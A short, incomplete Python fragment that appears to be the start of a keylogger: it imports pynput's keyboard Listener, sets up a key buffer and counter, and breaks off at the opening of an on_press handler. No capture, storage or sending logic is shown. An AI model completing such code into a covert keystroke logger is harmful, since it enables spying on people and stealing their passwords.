# Import python library(pynput)
import pynput

# Import listener key from pynput 
from pynput.keyboard import Key,Listener

count = 0
keys = []


def on_press(key):
    global keys, count